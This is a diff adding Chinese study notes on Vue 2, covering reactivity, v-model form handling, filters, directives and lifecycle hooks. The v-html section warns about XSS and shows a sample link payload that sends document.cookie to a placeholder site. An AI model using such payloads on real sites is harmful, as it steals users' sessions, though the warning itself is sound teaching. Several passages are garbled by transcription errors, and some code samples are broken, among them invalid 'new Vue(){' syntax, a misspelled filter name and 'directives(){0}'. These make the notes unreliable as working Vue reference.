@@ -708,3 +708,222 @@ Vue.set(vm.student,index,'打台球')// 修改可以用set
 
 ### 大总结
 
+Vue监视数据的原理:
+
+1. vue会监视data中所有层次的数据。
+
+2. 如何监测对象中的数据?
+
+   通过setter实现监视，且要在new Vue时就传入要监测的数据。
+
+   (1).对象中后追加的属性，Vue默认不做响应式处理
+
+   (2).如需给后添加的属性做响应式，请使用如下API:
+
+   ​	Vue.set(target.propertyName/index，value)或
+
+   ​	vm.$set(target.propertyName/index，value)
+
+3. 如何监测数组中的数据?
+
+   通过包裹数组更新元素的方法实现,本质就是做了两件事:
+
+   (1)．调用原生对应的方法对数组进行更新。
+
+   (2).重新解析模板,进而更新页面。
+
+4. 在Vue修改数组中的某个元素一定要用如下方法:
+
+   1. 使用这些API:push()、pop()、shift()、unshift()、splice()、sort()、reverse()
+   2. Vue.set()或vm.$set()
+
+特别注意: Vue.set()和vm.$set()不能给vm 或 vm的根数据对象添加属性!!
+
+## 1.13收集表单数据
+
+收集表单数据:
+
+​	若:<input type="text"/>，则v-model收集的是value值，用户输入的就是value值
+
+​	若:<input type="radio"/>，则v-model收集的是value值，且要给标签配置value值。
+
+​	若:<inpuf type="checkbox" />
+
+​		1.没有配置input的value属性，那么收集的就是checked（勾选 or未勾选，是布尔值)
+
+​		2.配置input的value属性:
+
+​			(1)v-model的初始值是非数组，那么收集的就是checked（勾选or未勾选，是布尔值）
+
+​			(2)v-model的初始值是数组，那么收集的的就是value组成的数组
+
+​	备注:v-model的三个修饰符:
+
+​		lazy:失去焦点再收集数据
+
+​		number:输入字符串转为有效的数字
+
+​		trim:输入首尾空格过滤
+
+## 1.14过滤器
+
+~~~js
+// 全局过滤器
+Vue.filter('myfilter',function(value){
+   return value.slice(0,4);
+})
+
+// 局部过滤器
+<h1>{{msg | myfiler | myfilter2 }}</h1>
+
+filters:{
+    myfilter(value){
+        return value.slice(0,4);
+    }
+}
+~~~
+
+过滤器:
+定义:对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）。
+
+语法:
+
+1. 注册过滤器: Vue.filter(name,callback)或new Vue{filters:{]
+2. 使用过滤器:{{ xxx│过滤器名}}或v-bind:属性= “xxx│过滤器名"
+
+备注:
+
+1. 过滤器也可以接收额外参数、多个过滤器也可以串联
+2. 并没有改变原本的数据,是产生新的对应的数据
+
+## 1.15内置指令
+
+我们学过的指令:
+
+v-bind:单向绑定解析表达式，可简写为:xXX
+
+v-model :双向数据绑定
+
+v-for:遍历数组/对象/字符串
+
+v-on:绑定事件监听,可简写为@
+
+v-if:条件渲染（动态控制节点是否存存在)
+
+v-else:条件渲染（动态控制节点是否存存在)
+
+v-show:条件渲染（动态控制节点是否展示)
+
+### v-text
+
+1. 作用:向其所在的节点中渲染文本内容。
+2. 与插值语法的区别: v-text会替换掉节点中的内容，{ixx}}则不会。
+
+### v-html
+
+要考虑到安全性问题
+
+<img src="https://tyangjian.oss-cn-shanghai.aliyuncs.com/tmp/202306101839442.png" alt="image-20230610183854816" style="zoom:50%;" />
+
+v-html指令:
+
+1. 作用:向指定节点中渲染包含html结构的内容。
+
+2. 与插值语法的区别:
+
+   (1).v-html会替换掉节点中所有的内容,{{xx}}则不会。
+
+   (2).v-html可以识别html结构。
+
+3. 严重注意: v-html有安全性问题!!!!
+
+​	(1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
+
+​	(2).一定要在可信的内容上使用v-html，永不要用在用户提交的内容上!
+
+~~~js
+<div v-html="str"></div>
+new Vue(){
+    el:"#root",
+    data:{
+        str:'<a href=javascript:location.href="xxxx网站?"+document.cookie >兄弟我找到很好玩的东西'
+    }
+}
+~~~
+
+### v-cloak
+
+v-cloak指令(没有值):
+
+1. 本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。
+2. 使用css配合v-cloak可以解决网速慢时页面展示出{{xXx}}的问题。
+
+### v-once
+
+v-once指令:
+
+1. v-once所在节点在初次动态渲染后，就视为静态内容了。
+2. 以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。
+
+### v-pre
+
+v-pre指令:
+
+1. 跳过其预在节点的编详过霜.
+2. 可利用它跳过:没有使用指令语法、没有使用插值语法的节点。公加快编译。
+
+## 1.16自定义指令
+
+~~~js
+directives:{
+    big(element,binding){
+        element.innerText = binding.value
+    }
+}
+~~~
+
+### 总结
+
+一、定义语法:
+
+(1).局部指令:
+
+~~~js
+new Vue({
+    directives:{嘴令名:配置对象}
+})
+new Vue({
+    directives(){0}
+})
+~~~
+
+(2).全局指令:
+
+Vue.directive(指令名,配置对象）或Vue.directive(指令名凹调函双)
+
+二、配置对象中常用的3个回调:
+
+​	(1).bind:指令与元素成功绑定时调用。
+
+​	(2).inserted:指令所在元素被插入页面时调用。
+
+​	(3).update:指令所在模板结构被重新解析时调用。
+
+三、备注:
+
+1. 指令定义时不加v-，但使用时要加v-;
+2. 指令名如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名。
+3. **<u>*这里的this都是win*</u>**
+
+## 1.17生命周期
+
+### 引出生命周期
+
+1. 又名:生命周期回调函数、生命周期函数、生命周期钩了。
+2. 是什么:Vue在关键时刻帮我们调用的一些特殊名称的函数。
+3. 生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的。
+4. 生命周期函数中的this指向是vm或组件实例对象。
+
+### 分析生命周期
+
+<img src="https://tyangjian.oss-cn-shanghai.aliyuncs.com/tmp/202306111359930.png" alt="image-20230611135908709" style="zoom: 80%;" />
